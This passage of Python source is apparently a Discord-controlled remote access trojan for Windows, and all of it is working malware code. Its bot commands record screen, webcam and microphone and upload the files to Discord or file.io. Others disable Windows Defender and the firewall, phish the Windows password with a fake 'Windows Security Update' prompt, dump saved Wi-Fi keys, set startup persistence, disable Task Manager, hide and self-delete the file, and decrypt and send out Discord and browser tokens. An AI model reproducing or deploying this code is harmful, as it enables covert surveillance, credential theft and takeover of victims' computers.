            out = cv2.VideoWriter(videeoo, fourcc, 20.0, (SCREEN_SIZE))
            counter = 0
            while counter < input2:
                counter = counter + 1
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
            out.release()
            check = videeoo
            if os.path.exists(check):
                check2 = os.stat(check).st_size
                if check2 > 7340032:
                    import requests
                    await message.channel.send("This may take some time because it is over 8 MB. Please wait...")
                    boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                    await message.channel.send("Video download link: " + boom)
                    await message.channel.send("[*] Command successfuly executed")
                else:
                    file = discord.File(check, filename="output.avi")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                try:
                    os.remove(check)
                except Exception:
                    pass

        if message.content.startswith("!reccam"):
            import cv2
            import os
            try:
                input1 = float(message.content[8:].strip())
            except ValueError:
                input1 = 5.0
            temp = (os.getenv('TEMP'))
            vid_capture = cv2.VideoCapture(0)
            vid_cod = cv2.VideoWriter_fourcc(*'XVID')
            loco = temp + r"\output.mp4"
            output = cv2.VideoWriter(loco, vid_cod, 20.0, (640,480))
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                ret, frame = vid_capture.read()
                if ret:
                    output.write(frame)
                if input3 >= input1:
                    break
            vid_capture.release()
            output.release()
            check = loco
            if os.path.exists(check):
                check2 = os.stat(check).st_size
                if check2 > 7340032:
                    import requests
                    await message.channel.send("This may take some time because it is over 8 MB. Please wait...")
                    boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                    await message.channel.send("Video download link: " + boom)
                    await message.channel.send("[*] Command successfuly executed")
                else:
                    file = discord.File(check, filename="output.mp4")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                try:
                    os.remove(check)
                except Exception:
                    pass

        if message.content.startswith("!recaudio"):
            import os
            try:
                seconds = float(message.content[10:].strip())
            except ValueError:
                seconds = 5.0
            temp = (os.getenv('TEMP'))
            fs = 44100
            laco = temp + r"\output.wav"
            try:
                import sounddevice as sd
                from scipy.io.wavfile import write
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                sd.wait()
                write(laco, fs, myrecording)
                check = laco
                if os.path.exists(check):
                    file = discord.File(check, filename="output.wav")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                    try:
                        os.remove(check)
                    except Exception:
                        pass
            except Exception as e:
                await message.channel.send(f"[!] Audio recording failed (missing libraries/hardware): {e}")

        if message.content.startswith("!delete"):
            import os
            instruction = message.content[8:].strip()
            if not instruction:
                await message.channel.send("[!] Please specify file path to delete.")
            else:
                try:
                    if os.path.exists(instruction):
                        os.remove(instruction)
                        await message.channel.send("[*] Command successfuly executed")
                    else:
                        await message.channel.send("[!] File path does not exist.")
                except Exception as e:
                    await message.channel.send(f"[!] An error has occurred: {e}")

        if message.content == "!disableantivirus":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:            
                import subprocess
                instruction = r'REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output
                result = str(shell().stdout.decode('CP437', errors='ignore'))
                done = result.split()
                if len(done) >= 3:
                    boom = done[2:]
                    if boom <= ['17763']:
                        os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                        await message.channel.send("[*] Command successfuly executed")
                    else:
                        os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                        await message.channel.send("[*] Command successfuly executed")
                else:
                    os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                    await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")

        if message.content == "!disablefirewall":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system(r"NetSh Advfirewall set allprofiles state off")
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")

        if message.content.startswith("!audio"):
            import os
            if message.attachments:
                temp = (os.getenv("TEMP"))
                temp_audio = temp + r"\audiofile.wav"
                if os.path.isfile(temp_audio):
                    os.remove(temp_audio)
                temp1 = temp + r"\sounds.vbs"
                if os.path.isfile(temp1):
                    os.remove(temp1)                
                await message.attachments[0].save(temp_audio)
                result = f'Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = "{temp_audio}": oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close'
                with open(temp1, 'w', encoding='utf-8') as f5:
                    f5.write(result)
                os.system(r"start %temp%\sounds.vbs")
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Please attach a .wav audio file.")

        if message.content == "!selfdestruct": 
            import inspect
            import os
            import sys
            uncritproc()
            cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
            hello = os.getpid()
            bat = f'@echo off & taskkill /F /PID {hello} & del "{cmd2}" /F & start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b'
            temp = (os.getenv("TEMP"))
            temp5 = temp + r"\delete.bat"
            if os.path.isfile(temp5):
                os.remove(temp5)                
            with open(temp5, 'w', encoding='utf-8') as f5:
                f5.write(bat)
            os.system(r"start /min %temp%\delete.bat")

        if message.content == "!windowspass":
            import sys
            import subprocess
            import os
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = f'Powershell "{cmd82} {cmd92}"'
            def shell():   
               output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               return output
            result = str(shell().stdout.decode('CP437', errors='ignore'))
            await message.channel.send("[*] Command successfuly executed\nPassword typed: " + result)

        if message.content == "!displayoff":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        if message.content == "!displayon":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                from pynput.keyboard import Key, Controller
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        if message.content == "!hide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system(f'attrib +h "{cmd237}"')
            await message.channel.send("[*] Command successfuly executed")

        if message.content == "!unhide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system(f'attrib -h "{cmd237}"')
            await message.channel.send("[*] Command successfuly executed")

        if message.content == "!ejectcd":
            import ctypes
            ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
            await message.channel.send("[*] Command successfuly executed")

        if message.content == "!retractcd":
            import ctypes
            ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
            await message.channel.send("[*] Command successfuly executed")

        if message.content == "!critproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                critproc()
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send(r"[*] Not admin :(")

        if message.content == "!uncritproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                uncritproc()
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send(r"[*] Not admin :(")

        if message.content.startswith("!website"):
            import subprocess
            website = message.content[9:].strip()
            if website:
                if not website.startswith('http'):
                    website = 'http://' + website
                subprocess.call('start ' + website, shell=True) 
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Please provide a website URL.")

        if message.content == "!distaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system('powershell New-Item "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Force -ErrorAction SilentlyContinue')
                os.system('powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")

        if message.content == "!enbtaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import winreg as reg
                try:
                    reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                except Exception:
                    pass
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")

        if message.content == "!getwifipass":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import subprocess
                x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437', errors='ignore')
                if "User profiles" in x:
                    x = x[x.find("User profiles\r\n-------------\r\n")+len("User profiles\r\n-------------\r\n"):].replace('\r\n\r\n"',"").replace('All User Profile', r'"All User Profile"')[4:]
                    lst = []
                    done = []
                    for i in x.splitlines():
                        i = i.replace('"All User Profile"     : ',"").strip()
                        if i:
                            lst.append(i)
                    for e in lst:
                        output = subprocess.run(f'NETSH WLAN SHOW PROFILE "{e}" KEY=CLEAR', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437', errors='ignore')
                        ok = "None"
                        for i in output.splitlines():
                            if "Key Content" in i:
                                ok = i.split(":")[-1].strip()
                                break
                        done.append(f'"{e}": "{ok}"')
                    await message.channel.send("[*] Command successfuly executed")  
                    await message.channel.send(str(done))
                else:
                    await message.channel.send("[!] No Wi-Fi profiles found.")
            else:
                await message.channel.send("[*] This command requires admin privileges")

        if message.content == "!startup":
            import ctypes
            import os
            import sys
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:  
                path = sys.argv[0]
                isexe = sys.argv[0].endswith("exe")
                if isexe:
                    os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y' )
                else:
                    os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y')
                    e = f"""
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python \\"{os.path.basename(sys.argv[0])}\\"", 0, True
"""
                    startup_vbs = f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs"
                    with open(startup_vbs, "w", encoding='utf-8') as f:
                        f.write(e)
                await message.channel.send("[*] Command successfuly executed")  
            else:
                await message.channel.send("[*] This command requires admin privileges")

        # FULLY FIXED DISCORD & BROWSER TOKENS COMMAND
        if message.content == "!getdiscordtokens":
            import os
            from re import findall
            import json
            import base64
            from win32crypt import CryptUnprotectData
            try:
                from Crypto.Cipher import AES
            except ImportError:
                from Cryptodome.Cipher import AES

            local = os.getenv("LOCALAPPDATA")
            roaming = os.getenv("APPDATA")
            
            paths = {
                'Discord': os.path.join(roaming, 'Discord'),
                'Discord Canary': os.path.join(roaming, 'discordcanary'),
                'Discord PTB': os.path.join(roaming, 'discordptb'),
                'Google Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
                'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
                'Firefox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles')
            }

            regex1 = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
            regex2 = r"mfa\.[\w-]{84}"
            encrypted_regex = r"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"

            def get_master_key(path):
                try:
                    local_state_path = os.path.join(path, "Local State")
                    if not os.path.exists(local_state_path):
                        local_state_path = os.path.join(os.path.dirname(path), "Local State")
                    if os.path.exists(local_state_path):
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        master_key = master_key[5:]
                        return CryptUnprotectData(master_key, None, None, None, 0)[1]
                except Exception:
                    pass
                return None

            def decrypt_token(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted = cipher.decrypt(payload)
                    return decrypted[:-16].decode('utf-8', errors='ignore')
                except Exception:
                    return None

            alltokens = []

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                
                for sub in [os.path.join('Local Storage', 'leveldb'), 'Network', '']:
                    target_dir = os.path.join(path, sub) if sub else path
                    if not os.path.exists(target_dir):
                        continue
                    try:
                        for file_name in os.listdir(target_dir):
                            if file_name.endswith(('.log', '.ldb', '.sqlite')):
                                file_path = os.path.join(target_dir, file_name)
                                try:
                                    with open(file_path, "r", errors='ignore') as lf:
                                        content = lf.read()
                                        for token in findall(regex1, content):
                                            if token not in alltokens:
                                                alltokens.append(token)
                                        for token in findall(regex2, content):
                                            if token not in alltokens:
                                                alltokens.append(token)
                                        for enc_str in findall(encrypted_regex, content):
                                            master_key = get_master_key(path)
                                            if master_key:
                                                try:
                                                    raw_data = base64.b64decode(enc_str.split('dQw4w9WgXcQ:')[1])
                                                    token = decrypt_token(raw_data, master_key)
                                                    if token and token not in alltokens:
                                                        alltokens.append(token)
                                                except Exception:
                                                    pass
                                except Exception:
                                    continue
                    except Exception:
                        continue

            if alltokens:
                await message.channel.send("Found Tokens:\n" + "\n".join(alltokens))
            else:
                await message.channel.send("[!] No tokens found.")

client.run(token)